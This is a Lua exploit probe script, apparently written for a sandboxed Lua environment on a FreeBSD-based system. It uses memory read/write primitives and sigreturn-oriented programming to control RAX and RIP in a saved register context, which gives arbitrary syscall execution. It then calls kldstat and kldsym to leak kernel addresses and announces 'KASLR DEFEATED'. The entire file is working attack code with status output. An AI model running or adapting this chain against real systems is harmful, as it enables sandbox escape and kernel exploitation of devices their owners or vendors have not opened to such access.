-- CRASH_CLASS: HIGH
-- PROBE 128d: SROP RAX CONTROL + ARBITRARY SYSCALL
--
-- 128c-A PROVED: sigreturn with unmodified context returns rv=0
-- (the captured RAX). The Lua VM continues from the sigreturn call
-- because Lua state is heap-based, unaffected by register restore.
--
-- IMPLICATION: RAX in the context becomes sc_sigreturn()'s return value!
-- If we modify RAX=0x1337 → rv should be 0x1337
-- If we set RIP=captured_rip-2 (syscall instr), RAX=20 → rv should be PID
--
-- Sections:
--   A: RAX=0x1337 tag test (prove RAX control)
--   B: RAX=20, RIP=captured_rip-2 (getpid via SROP)
--   C: If B works → kldstat(308) via SROP for kernel base

print("=== PROBE 128d: SROP RAX CONTROL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local sc624 = make_syscall(624)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- Correct offsets
local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local RCX = MC + 0x20
local R8  = MC + 0x28
local R9  = MC + 0x30
local R10 = MC + 0x50
local RIP = MC + 0xA0
local CS  = MC + 0xA8
local RFLAGS = MC + 0xB0
local RSP = MC + 0xB8
local SS  = MC + 0xC0
local LEN = MC + 0xC8
local CTX_SIZE = 0x500

--------------------------------------------------------------------
-- SECTION A: RAX=0x1337 tag test
--------------------------------------------------------------------
print("--- SECTION A: RAX tag test ---")

local ctx_a = memory.alloc(CTX_SIZE)
zero(ctx_a, CTX_SIZE)
local ok_gc, rv_gc = pcall(function() return sc_getcontext(uint64(ctx_a)) end)
print("[A] getcontext: rv=" .. hex(rv_gc))

wq(ctx_a + RAX, uint64(0x1337))
print("[A] RAX set to 0x1337")

local ok_sr, rv_sr = pcall(function() return sc_sigreturn(uint64(ctx_a)) end)
print("[A] sigreturn: ok=" .. tostring(ok_sr) .. " rv=" .. hex(rv_sr))

local rv_h, rv_l = get_hi_lo(rv_sr)
if rv_l == 0x1337 then
    print("[A] *** RAX CONTROLS RETURN VALUE! 0x1337 confirmed ***")
elseif rv_l == 0 then
    print("[A] rv=0 (RAX not applied — dispatch overwrites?)")
else
    print("[A] unexpected rv=" .. hex(rv_sr))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION A2: RAX=0xDEADBEEF (second tag)
--------------------------------------------------------------------
print("")
print("--- SECTION A2: RAX=0xDEADBEEF ---")

local ctx_a2 = memory.alloc(CTX_SIZE)
zero(ctx_a2, CTX_SIZE)
pcall(function() return sc_getcontext(uint64(ctx_a2)) end)

wq(ctx_a2 + RAX, uint64(0xDEADBEEF))

local ok_a2, rv_a2 = pcall(function() return sc_sigreturn(uint64(ctx_a2)) end)
print("[A2] sigreturn: ok=" .. tostring(ok_a2) .. " rv=" .. hex(rv_a2))
local rv2_h, rv2_l = get_hi_lo(rv_a2)
if rv2_l == 0xDEADBEEF then
    print("[A2] *** CONFIRMED: rv=0xDEADBEEF ***")
end

--------------------------------------------------------------------
-- SECTION B: RIP=captured_rip-2, RAX=20 → getpid via SROP
-- If captured_rip-2 is the `syscall` instruction:
--   CPU executes syscall with RAX=20 → kernel does getpid
--   Returns to captured_rip (next instruction after syscall)
--   Dispatch returns PID as the return value
--------------------------------------------------------------------
print("")
print("--- SECTION B: getpid via SROP (RIP-2 = syscall) ---")

local ctx_b = memory.alloc(CTX_SIZE)
zero(ctx_b, CTX_SIZE)
local ok_gc_b, rv_gc_b = pcall(function() return sc_getcontext(uint64(ctx_b)) end)

if ok_gc_b and to_num(rv_gc_b) == 0 then
    local rip_b = rq(ctx_b + RIP)
    local rip_h, rip_l = get_hi_lo(rip_b)
    local syscall_addr = uint64(string.format("0x%X%08X", rip_h, rip_l - 2))
    print("[B] captured RIP=" .. hex(rip_b))
    print("[B] syscall_addr (RIP-2)=" .. hex(syscall_addr))

    wq(ctx_b + RIP, syscall_addr)
    wq(ctx_b + RAX, uint64(20))

    local ok_b, rv_b = pcall(function() return sc_sigreturn(uint64(ctx_b)) end)
    print("[B] sigreturn: ok=" .. tostring(ok_b) .. " rv=" .. hex(rv_b))

    if ok_b then
        local bh, bl = get_hi_lo(rv_b)
        if bl == pid then
            print("[B] *** GETPID VIA SROP! rv=" .. bl .. " == pid=" .. pid .. " ***")
            print("[B] *** ARBITRARY SYSCALL EXECUTION CONFIRMED! ***")
        elseif bl > 0 and bl < 65536 then
            print("[B] possible PID: rv=" .. bl .. " (expected " .. pid .. ")")
        else
            print("[B] unexpected rv (not a pid)")
        end
    end
    print("[B] pid=" .. to_num(sc20()))
end

--------------------------------------------------------------------
-- SECTION C: getuid(24), geteuid(25) — verify multiple syscalls
--------------------------------------------------------------------
print("")
print("--- SECTION C: getuid + geteuid via SROP ---")

local ctx_c1 = memory.alloc(CTX_SIZE)
zero(ctx_c1, CTX_SIZE)
pcall(function() return sc_getcontext(uint64(ctx_c1)) end)
local rip_c = rq(ctx_c1 + RIP)
local rc_h, rc_l = get_hi_lo(rip_c)
local sc_addr_c = uint64(string.format("0x%X%08X", rc_h, rc_l - 2))

wq(ctx_c1 + RIP, sc_addr_c)
wq(ctx_c1 + RAX, uint64(24))  -- getuid

local ok_uid, rv_uid = pcall(function() return sc_sigreturn(uint64(ctx_c1)) end)
print("[C] getuid(24): ok=" .. tostring(ok_uid) .. " rv=" .. hex(rv_uid))

local ctx_c2 = memory.alloc(CTX_SIZE)
zero(ctx_c2, CTX_SIZE)
pcall(function() return sc_getcontext(uint64(ctx_c2)) end)
local rip_c2 = rq(ctx_c2 + RIP)
local rc2_h, rc2_l = get_hi_lo(rip_c2)
local sc_addr_c2 = uint64(string.format("0x%X%08X", rc2_h, rc2_l - 2))

wq(ctx_c2 + RIP, sc_addr_c2)
wq(ctx_c2 + RAX, uint64(25))  -- geteuid

local ok_euid, rv_euid = pcall(function() return sc_sigreturn(uint64(ctx_c2)) end)
print("[C] geteuid(25): ok=" .. tostring(ok_euid) .. " rv=" .. hex(rv_euid))
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: kldstat(308) → kernel base address
--------------------------------------------------------------------
print("")
print("--- SECTION D: kldstat(308) via SROP ---")

local sc_mmap = make_syscall(477)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[D] kld_buf=" .. hex(gpu))

if ok_mm then
    local kld_buf = gpu
    zero(kld_buf, 0x200)
    wd(kld_buf, 0x1A0)  -- kld_file_stat version/size

    local ctx_d = memory.alloc(CTX_SIZE)
    zero(ctx_d, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx_d)) end)
    local rip_d = rq(ctx_d + RIP)
    local rd_h, rd_l = get_hi_lo(rip_d)
    local sc_addr_d = uint64(string.format("0x%X%08X", rd_h, rd_l - 2))

    wq(ctx_d + RIP, sc_addr_d)
    wq(ctx_d + RAX, uint64(308))      -- SYS_kldstat
    wq(ctx_d + RDI, uint64(1))        -- fileid=1 (kernel)
    wq(ctx_d + RSI, kld_buf)           -- stat buf

    local ok_d, rv_d = pcall(function() return sc_sigreturn(uint64(ctx_d)) end)
    print("[D] kldstat: ok=" .. tostring(ok_d) .. " rv=" .. hex(rv_d))

    -- Dump kld_file_stat
    print("[D] kld_file_stat dump:")
    local found_kptr = false
    for off = 0, 0x1A0 - 4, 8 do
        local v = rq(kld_buf + off)
        if v then
            local h, l = get_hi_lo(v)
            if h ~= 0 or l ~= 0 then
                print(string.format("  +0x%03X: %s", off, hex(v)))
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print("  *** KERNEL POINTER! ***")
                    found_kptr = true
                end
            end
        end
    end

    if found_kptr then
        print("[D] *** KASLR DEFEATED! KERNEL BASE FOUND! ***")
    end

    -- Also try kldsym(309) — look up a kernel symbol
    print("")
    print("--- SECTION E: kldsym(309) via SROP ---")

    local sym_buf = gpu + 0x200
    zero(sym_buf, 0x100)
    -- struct kld_sym_lookup: version(4), symname(ptr), symvalue(8), symsize(8)
    wd(sym_buf, 0x20)  -- version

    -- Write "printf" name string
    local name_buf = gpu + 0x300
    pcall(function() memory.write_byte(name_buf + 0, 0x70) end)  -- p
    pcall(function() memory.write_byte(name_buf + 1, 0x72) end)  -- r
    pcall(function() memory.write_byte(name_buf + 2, 0x69) end)  -- i
    pcall(function() memory.write_byte(name_buf + 3, 0x6E) end)  -- n
    pcall(function() memory.write_byte(name_buf + 4, 0x74) end)  -- t
    pcall(function() memory.write_byte(name_buf + 5, 0x66) end)  -- f
    pcall(function() memory.write_byte(name_buf + 6, 0x00) end)  -- \0
    wq(sym_buf + 8, name_buf)  -- symname pointer

    local ctx_e = memory.alloc(CTX_SIZE)
    zero(ctx_e, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx_e)) end)
    local rip_e = rq(ctx_e + RIP)
    local re_h, re_l = get_hi_lo(rip_e)
    local sc_addr_e = uint64(string.format("0x%X%08X", re_h, re_l - 2))

    wq(ctx_e + RIP, sc_addr_e)
    wq(ctx_e + RAX, uint64(309))      -- SYS_kldsym
    wq(ctx_e + RDI, uint64(0))        -- fileid=0 (kernel)
    wq(ctx_e + RSI, uint64(1))        -- KLDSYM_LOOKUP
    wq(ctx_e + RDX, sym_buf)          -- data

    local ok_e, rv_e = pcall(function() return sc_sigreturn(uint64(ctx_e)) end)
    print("[E] kldsym: ok=" .. tostring(ok_e) .. " rv=" .. hex(rv_e))

    local sym_val = rq(sym_buf + 0x10)  -- symvalue
    if sym_val then
        local sh, sl = get_hi_lo(sym_val)
        print("[E] printf symvalue=" .. hex(sym_val))
        if sh >= 0xFFFF8000 and sh ~= 0xFFFFFFFF then
            print("[E] *** KERNEL SYMBOL ADDRESS! KASLR DEFEATED! ***")
        end
    end
end

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 128d COMPLETE ===")
